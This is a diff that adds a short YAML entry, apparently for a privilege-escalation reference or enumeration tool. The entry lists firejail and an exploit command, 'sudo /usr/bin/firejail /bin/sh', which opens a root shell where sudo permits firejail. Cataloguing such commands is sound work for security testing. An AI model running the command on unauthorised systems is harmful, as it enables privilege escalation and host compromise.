@@ -1,0 +1,4 @@
+name: firejail
+binary_path: /usr/bin/firejail
+exploit_cmds:
+- sudo /usr/bin/firejail /bin/sh
